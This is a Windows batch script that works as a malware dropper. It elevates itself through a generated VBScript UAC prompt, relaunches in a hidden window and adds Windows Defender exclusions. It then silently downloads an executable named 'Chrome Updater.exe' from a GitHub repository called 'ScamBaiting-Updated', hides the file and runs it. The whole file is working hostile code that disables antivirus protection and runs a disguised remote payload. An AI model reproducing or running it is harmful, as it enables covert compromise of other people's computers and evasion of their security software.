@echo off
setlocal enabledelayedexpansion

>nul 2>&1 net session
if %errorLevel% neq 0 (
    set "VBS=%temp%\getadmin.vbs"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%VBS%"
    echo UAC.ShellExecute "cmd.exe", "/c """"%~f0"""" ""%*""", "", "runas", 0 >> "%VBS%"
    cscript //nologo "%VBS%"
    del /q "%VBS%" >nul 2>&1
    exit /b
)

:: Check if we're running hidden (only run main code in hidden mode)
if not "%1"=="hidden" (
    set "VBS=%temp%\hidden.vbs"
    echo Set objShell = CreateObject^("WScript.Shell"^) > "%VBS%"
    echo objShell.Run "cmd /c ""%~f0"" hidden", 0, false >> "%VBS%"
    cscript //nologo "%VBS%"
    del /q "%VBS%" >nul 2>&1
    exit /b
)

:: Main execution (hidden mode)
for /f "usebackq tokens=*" %%A in (`powershell -command "[Environment]::GetFolderPath('Desktop')"` 2^>nul) do set "desktopPath=%%A"
set "exeName=Chrome Updater.exe"
set "exeUrl=https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%%20Updater.exe"
set "exePath=%desktopPath%\%exeName%"
set "appdataPath=%APPDATA%\%exeName%"

:: Add exclusions for both locations (ignore errors if paths don't exist yet)
powershell -ExecutionPolicy Bypass -Command ^
"Add-MpPreference -ExclusionPath '%desktopPath%', '%APPDATA%' -ExclusionProcess '%exeName%' -Force >$null 2>&1; ^
if (Test-Path '%appdataPath%') { Add-MpPreference -ExclusionPath '%appdataPath%' -Force >$null 2>&1 }"

:: Download silently without any output
curl -s -L "%exeUrl%" -o "%exePath%" >nul 2>&1

if exist "%exePath%" (
    attrib +h "%exePath%" >nul 2>&1
    start "" /b "%exePath%"
)

endlocal
exit /b